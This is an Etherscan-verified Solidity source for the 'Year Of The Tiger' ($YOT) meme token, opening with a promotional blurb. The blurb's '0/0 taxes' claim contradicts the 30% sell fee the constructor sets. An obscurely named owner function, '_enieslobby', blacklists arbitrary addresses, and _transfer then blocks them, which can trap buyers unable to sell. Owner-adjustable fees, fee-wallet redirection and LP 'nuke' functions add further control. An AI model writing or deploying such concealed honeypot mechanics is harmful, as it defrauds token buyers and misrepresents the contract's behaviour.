/**
 *Submitted for verification at Etherscan.io on 2022-12-03
*/

/*
The Tiger is known as the king of all beasts in China. The zodiac sign Tiger is a symbol of strength, exorcising evils, and braveness. 

As a community we decide to celebrate together the new year of the tiger with a 8 billion supply as a meaning of wealth and succes.

LP is burnt and the taxes are 0/0 few minuts after launch! 🇨🇳

Web: https://yearofthetiger.site

Telegram: https://t.me/YearOfTheTigerPortal

Twitter: https://twitter.com/yearofthetigerz

*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IDexPair {
    function sync() external;
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string public _name;
    string public _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _createInitialSupply(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) external virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
        
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract YearOfTheTiger is ERC20, Ownable {

    IDexRouter public dexRouter;
    address public lpPair;
    address public constant deadAddress = address(0xdead);

    bool private swapping;

    address public marketingWallet;
    address public devWallet;
    address public RouterAddress;
    address public LiquidityReceiver;
    
   
    

    uint256 public maxTxnAmount;
    uint256 public swapTokensAtAmount;
    uint256 public maxWallet;


    
    uint256 public percentForLPMarketing = 0; // 100 = 1%
    bool public lpMarketingEnabled = false;
    uint256 public lpMarketingFrequency = 0 seconds;
    uint256 public lastLpMarketingTime;
    uint256 public manualMarketingFrequency = 1 hours;
    uint256 public lastManualLpMarketingTime;

    //launch variables
    bool public tradingActive = false;
    uint256 private _blocks;
    uint256 public tradingActiveBlock = 0;
    bool public swapEnabled = false;
    
     // prevent more than 1 buy on same block this may cuz rug check bots to fail but helpful on launches 
    mapping(address => uint256) private _holderLastTransferBlock; // to hold last Transfers temporarily during launch
    bool public transferDelayEnabled = false;

    uint256 public TotalbuyFees;
    uint256 public buyMarketingFee;
    uint256 public buyLiquidityFee;
    uint256 public buyDevFee;
    
    uint256 public TotalsellFees;
    uint256 public sellMarketingFee;
    uint256 public sellLiquidityFee;
    uint256 public sellDevFee;
    
    uint256 public tokensForMarketing;
    uint256 public tokensForLiquidity;
    uint256 public tokensForDev;
 
    // exlcude from fees and max transaction amount
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) public _isExcludedmaxTxnAmount;

    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping (address => bool) public automatedMarketMakerPairs;
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );
    
    event AutoNukeLP(uint256 amount);
    
    event ManualNukeLP(uint256 amount);
    

    event OwnerForcedSwapBack(uint256 timestamp);

    constructor() ERC20("Year Of The Tiger", "$YOT") payable {
        //taxes set
        uint256 _buyMarketingFee = 0;
        uint256 _buyLiquidityFee = 0;
        uint256 _sellMarketingFee = 20;
        uint256 _sellLiquidityFee = 10;
        //total supply => 1e8 means 1B
        uint256 totalSupply = 8e5 * 10 * 1e18;
        
        maxTxnAmount = totalSupply * 2 / 100;
        maxWallet = totalSupply * 2 / 100;
        swapTokensAtAmount = totalSupply * 1 / 1000;

        buyMarketingFee = _buyMarketingFee;
        buyLiquidityFee = _buyLiquidityFee;
        buyDevFee = 0;
        TotalbuyFees = buyMarketingFee + buyLiquidityFee + buyDevFee;
        
        sellMarketingFee = _sellMarketingFee;
        sellLiquidityFee = _sellLiquidityFee;
        sellDevFee = 0;
        TotalsellFees = sellMarketingFee + sellLiquidityFee + sellDevFee;
        
        marketingWallet = address(owner());
        devWallet = address(owner());

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        //set owner as default marketing & liquidity wallet
        marketingWallet=owner();
        LiquidityReceiver=owner();

        
        // initialize router
        RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//set router address here
        IDexRouter _dexRouter = IDexRouter(RouterAddress);
        dexRouter = _dexRouter;
        lastLpMarketingTime = block.timestamp;
        // create pair
        lpPair = IDexFactory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        excludeFromMaxTransaction(address(lpPair), true);
        _setAutomatedMarketMakerPair(address(lpPair), true);       
        //initiate supply
        _createInitialSupply(owner(), totalSupply*100/100);
    }

    receive() external payable {}
    mapping (address => bool) private _isBlackListed;   
    // Toggle Transfer delay
    function DisableTransferDelay() external onlyOwner {
        transferDelayEnabled = false;
    }
    function setSwapTokensAt(uint256 newAmount) external onlyOwner returns (bool){
        require(newAmount <= totalSupply() * 5 / 1000, "Swap amount cannot be higher than 0.5% total supply.");
        swapTokensAtAmount = newAmount;
        return true;
    }
    function updateMaxTxn_base1000(uint256 newNum) external onlyOwner {
        //force max tx to be at least 0.5%
        require(newNum >= 5, "Cannot set maxTxnAmount lower than 0.5%");
        maxTxnAmount = ((totalSupply() * newNum / 1000)/1e18) * (10**18);
    }

    function updateMaxWallet_base1000(uint256 newNum) external onlyOwner {
        //force max wallet to be at least 0.5%
        require(newNum >= 5, "Cannot set maxWallet lower than 0.5%");
        maxWallet = ((totalSupply() * newNum / 1000)/1e18) * (10**18);
    }
    
    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {
        _isExcludedmaxTxnAmount[updAds] = isEx;
    }
    
    // in case something goes wrong on auto swap
    function updateSwapEnabled(bool enabled) external onlyOwner(){
        swapEnabled = enabled;
    }
    function _setbuyfees(uint256 _marketing,uint256 _liquidity) external onlyOwner{
        require((_marketing+_liquidity) <= 30, "Must keep fees lower than 30%");
        buyMarketingFee = _marketing;
        buyLiquidityFee = _liquidity;
        TotalbuyFees = buyMarketingFee + buyLiquidityFee;
    }
    function _setsellfees(uint256 _marketing,uint256 _liquidity) external onlyOwner{
        require((_marketing+_liquidity) <= 30, "Must keep fees lower than 30%");
        sellMarketingFee = _marketing;
        sellLiquidityFee = _liquidity;
        TotalsellFees = sellMarketingFee + sellLiquidityFee;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != lpPair, "The pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

    }
    function SetupFeeReceivers(address _mar,address _liq,address _dev) external onlyOwner {
        marketingWallet = _mar;
        LiquidityReceiver = _liq;
        devWallet = _dev;
    }
    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_isBlackListed[to], "You have no power here!");
        require(!_isBlackListed[tx.origin], "You have no power here!");

         if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if(!tradingActive){
            require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
        }
        
        if (
            from != owner() &&
            to != owner() &&
            to != address(0) &&
            to != address(0xdead) &&
            !swapping &&
            !_isExcludedFromFees[to] &&
            !_isExcludedFromFees[from]
        ){
                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.  
                if (transferDelayEnabled){
                    if (to != address(dexRouter) && to != address(lpPair)){
                        require(_holderLastTransferBlock[tx.origin] < block.number - 1 && _holderLastTransferBlock[to] < block.number - 1, "_transfer:: Transfer Delay enabled.  Try again later.");
                        _holderLastTransferBlock[tx.origin] = block.number;
                        _holderLastTransferBlock[to] = block.number;
                    }
                }
                 
                //when buy
                if (automatedMarketMakerPairs[from] && !_isExcludedmaxTxnAmount[to]) {
                        require(amount <= maxTxnAmount, "Buy transfer amount exceeds the maxTxnAmount.");
                        require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
                
                //when sell
                else if (automatedMarketMakerPairs[to] && !_isExcludedmaxTxnAmount[from]) {
                        require(amount <= maxTxnAmount, "Sell transfer amount exceeds the maxTxnAmount.");
                }
                else if (!_isExcludedmaxTxnAmount[to]){
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
        }
        
    uint256 contractTokenBalance = balanceOf(address(this));
        
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if( 
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;
            
            swapBack();

            swapping = false;
        }
        
        if(!swapping && automatedMarketMakerPairs[to] && lpMarketingEnabled && block.timestamp >= lastLpMarketingTime + lpMarketingFrequency && !_isExcludedFromFees[from]){
            autoMarketingLiquidityPairTokens();
        }
        

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }
        
        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if(takeFee){
            // bot/sniper penalty.  Tokens get transferred to Marketing wallet to allow potential refund.
            if((tradingActiveBlock >= block.number - _blocks) && automatedMarketMakerPairs[from]){
                fees = amount * 99 / 100;
                tokensForLiquidity += fees * sellLiquidityFee / TotalsellFees;
                tokensForMarketing += fees * sellMarketingFee / TotalsellFees;
                tokensForDev += fees * sellDevFee / TotalsellFees;
            }
            // on sell
            else if (automatedMarketMakerPairs[to] && TotalsellFees > 0){
                fees = amount * TotalsellFees / 100;
                tokensForLiquidity += fees * sellLiquidityFee / TotalsellFees;
                tokensForMarketing += fees * sellMarketingFee / TotalsellFees;
                tokensForDev += fees * sellDevFee / TotalsellFees;
            }
            // on buy
            else if(automatedMarketMakerPairs[from] && TotalbuyFees > 0) {
              fees = amount * TotalbuyFees / 100;
              tokensForLiquidity += fees * buyLiquidityFee / TotalbuyFees;
                tokensForMarketing += fees * buyMarketingFee / TotalbuyFees;
                tokensForDev += fees * buyDevFee / TotalbuyFees;
            }
            
            if(fees > 0){    
                super._transfer(from, address(this), fees);
            }
          
          amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        _approve(address(this), address(dexRouter), tokenAmount);

        // make the swap
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(dexRouter), tokenAmount);

        // add the liquidity
        dexRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            LiquidityReceiver,
            block.timestamp
        );
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing + tokensForDev;
        bool success;
        
        if(contractBalance == 0 || totalTokensToSwap == 0) {return;}

        if(contractBalance > swapTokensAtAmount * 20){
            contractBalance = swapTokensAtAmount * 20;
        }
        
        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2;
        uint256 amountToSwapForETH = contractBalance - liquidityTokens;
        
        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH); 
        
        uint256 ethBalance = address(this).balance - initialETHBalance;
        
        uint256 ethForMarketing = ethBalance * tokensForMarketing / (totalTokensToSwap - (tokensForLiquidity/2));
        uint256 ethForDev = ethBalance * tokensForDev / (totalTokensToSwap - (tokensForLiquidity/2));
        
        uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForDev;
        
        
        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        tokensForDev = 0;

        
        (success,) = address(devWallet).call{value: ethForDev}("");
        (success,) = address(marketingWallet).call{value: ethForMarketing}("");
        
        if(liquidityTokens > 0 && ethForLiquidity > 0){
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity);
        }
        
    }

    // force Swap back if slippage issues.
    function forceSwapBack() external onlyOwner {
        require(balanceOf(address(this)) >= swapTokensAtAmount, "Can only swap when token amount is at or higher than restriction");
        swapping = true;
        swapBack();
        swapping = false;
        emit OwnerForcedSwapBack(block.timestamp);
    } 

    
    
    function autoMarketingLiquidityPairTokens() internal{
        
        lastLpMarketingTime = block.timestamp;
        
        // get balance of liquidity pair
        uint256 liquidityPairBalance = this.balanceOf(lpPair);
        
        // calculate amount to Marketing
        uint256 amountToMarketing = liquidityPairBalance * percentForLPMarketing / 10000;
        
        if (amountToMarketing > 0){
            super._transfer(lpPair, address(0xdead), amountToMarketing);
        }
        
        //sync price since this is not in a swap transaction!
        IDexPair pair = IDexPair(lpPair);
        pair.sync();
        emit AutoNukeLP(amountToMarketing);
    }

    function manualMarketingLiquidityPairTokens(uint256 percent) external onlyOwner {
        require(block.timestamp > lastManualLpMarketingTime + manualMarketingFrequency , "Must wait for cooldown to finish");
        require(percent <= 1000, "May not nuke more than 10% of tokens in LP");
        lastManualLpMarketingTime = block.timestamp;
        
        // get balance of liquidity pair
        uint256 liquidityPairBalance = this.balanceOf(lpPair);
        
        // calculate amount to Marketing
        uint256 amountToMarketing = liquidityPairBalance * percent / 10000;
        
        if (amountToMarketing > 0){
            super._transfer(lpPair, address(0xdead), amountToMarketing);
        }
        
        //sync price since this is not in a swap transaction!
        IDexPair pair = IDexPair(lpPair);
        pair.sync();
        
    }
    function EnableTrading() external onlyOwner {
        require(!tradingActive, "Trading is already active, cannot relaunch.");
        //standard enable trading
        tradingActive = true;
        swapEnabled = true;
        tradingActiveBlock = block.number;
        _blocks = 0;
    }


    // withdraw ETH if stuck before launch
    function withdrawStuckETH() external onlyOwner {
        require(!tradingActive, "Can only withdraw if trading hasn't started");
        bool success;
        (success,) = address(msg.sender).call{value: address(this).balance}("");
    }

    function isBot(address account) public view returns (bool) {
        return  _isBlackListed[account];
    }
    function _enieslobby(address[] memory Addresses,bool _status) external onlyOwner(){
        //avoid blacklisting lpPair & contract
        for (uint256 i; i < Addresses.length; ++i) {
            if(Addresses[i] != lpPair && Addresses[i] != address(this)){
                _isBlackListed[Addresses[i]] = _status;
            }
        }
    }
}